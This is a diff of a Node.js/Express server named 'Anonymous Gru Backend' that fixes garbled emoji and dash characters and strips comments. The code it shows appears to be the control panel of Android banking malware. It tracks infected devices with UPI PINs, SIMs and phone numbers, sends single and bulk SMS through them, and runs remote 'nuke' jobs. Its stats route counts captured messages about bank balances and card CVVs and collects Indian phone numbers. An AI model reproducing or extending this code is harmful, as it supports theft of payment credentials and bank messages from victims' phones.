@@ -10,7 +10,7 @@ const PORT = process.env.PORT || 3000;
 // ---------- Paths ----------
 const DATA_DIR = path.join(__dirname, 'data');
 const PUBLIC_DIR = path.join(__dirname, 'public');
-const STATIC_DIR = path.join(__dirname, 'static');   // <-- Added static folder
+const STATIC_DIR = path.join(__dirname, 'static');
 const DEVICES_FILE = path.join(DATA_DIR, 'devices.json');
 const MESSAGES_FILE = path.join(DATA_DIR, 'messages.json');
 const OUTBOX_FILE = path.join(DATA_DIR, 'outbox.json');
@@ -45,8 +45,8 @@ app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 
 // ---------- Static Files ----------
-app.use(express.static(PUBLIC_DIR));   // Serves from /public
-app.use(express.static(STATIC_DIR));   // Serves from /static (your existing static folder)
+app.use(express.static(PUBLIC_DIR));
+app.use(express.static(STATIC_DIR));
 
 // ============================================
 //              API ROUTES
@@ -140,17 +140,17 @@ app.post('/api/devices', (req, res) => {
       id,
       name: name || existing.name || id,
       status: status !== undefined ? status : (existing.status || false),
-      battery: battery || existing.battery || 'â€”',
-      android: android || existing.android || 'â€”',
-      ip: ip || existing.ip || 'â€”',
-      storage: storage || existing.storage || 'â€”',
-      provider: provider || existing.provider || 'â€”',
-      cpu: cpu || existing.cpu || 'â€”',
-      sdk: sdk || existing.sdk || 'â€”',
+      battery: battery || existing.battery || '—',
+      android: android || existing.android || '—',
+      ip: ip || existing.ip || '—',
+      storage: storage || existing.storage || '—',
+      provider: provider || existing.provider || '—',
+      cpu: cpu || existing.cpu || '—',
+      sdk: sdk || existing.sdk || '—',
       sims: sims || existing.sims || [],
       upipin: upipin || existing.upipin || null,
       modelName: modelName || existing.modelName || name || id,
-      phoneNumber: phoneNumber || existing.phoneNumber || 'â€”',
+      phoneNumber: phoneNumber || existing.phoneNumber || '—',
       lastSeen: lastSeen || Date.now(),
       updatedAt: Date.now()
     };
@@ -262,7 +262,7 @@ app.post('/api/sms/send', (req, res) => {
       messages[deviceId] = [];
     }
     messages[deviceId].push({
-      sender: 'ðŸ“¤ Device',
+      sender: '📤 Device',
       message: `To: ${to}\n${message}`,
       dateTime: entry.dateTime,
       timestamp: entry.timestamp,
@@ -325,7 +325,7 @@ app.post('/api/sms/bulk', (req, res) => {
     }
     entries.forEach(entry => {
       messages[deviceId].push({
-        sender: 'ðŸ“¤ Device (Bulk)',
+        sender: '📤 Device (Bulk)',
         message: `To: ${entry.to}\n${entry.message}`,
         dateTime: entry.dateTime,
         timestamp: entry.timestamp,
@@ -411,7 +411,7 @@ app.post('/api/nuke', (req, res) => {
         if (finalJobs[deviceId]) {
           finalJobs[deviceId].status = 'completed';
           finalJobs[deviceId].completedAt = Date.now();
-          finalJobs[deviceId].message = 'âœ… Nuke completed successfully!';
+          finalJobs[deviceId].message = '✅ Nuke completed successfully!';
           writeJSON(NUKE_JOBS_FILE, finalJobs);
         }
       }
@@ -453,7 +453,7 @@ app.get('/api/stats', (req, res) => {
       const msgs = messages[deviceId] || [];
       msgs.forEach(msg => {
         const text = (msg.message || '').toLowerCase();
-        if (/balance|avail|credited|debited|â‚¹|inr/i.test(text)) bankCount++;
+        if (/balance|avail|credited|debited|₹|inr/i.test(text)) bankCount++;
         if (/card|cvv|expiry|credit|debit/i.test(text)) cardCount++;
         const phoneMatch = text.match(/(?:\+91|0)?[6-9]\d{9}/);
         if (phoneMatch) phoneNumbers.add(phoneMatch[0]);
@@ -480,17 +480,15 @@ app.get('/api/stats', (req, res) => {
 // ---------- FALLBACK FOR SPA ----------
 // Serve index.html for any non-API route (supports client-side routing)
 app.get('*', (req, res) => {
-  // If request is for an API endpoint that wasn't caught, return 404
   if (req.path.startsWith('/api/')) {
     return res.status(404).json({ error: `API endpoint not found: ${req.path}` });
   }
-  // Otherwise serve index.html (SPA fallback)
   res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
 });
 
 // ---------- Start Server ----------
 app.listen(PORT, () => {
-  console.log(`\nðŸš€ Anonymous Gru Backend running on port ${PORT}`);
-  console.log(`ðŸ“ Frontend: http://localhost:${PORT}`);
-  console.log(`ðŸ“¡ API Info: http://localhost:${PORT}/api\n`);
+  console.log(`\n🚀 Anonymous Gru Backend running on port ${PORT}`);
+  console.log(`📍 Frontend: http://localhost:${PORT}`);
+  console.log(`📡 API Info: http://localhost:${PORT}/api\n`);
 });
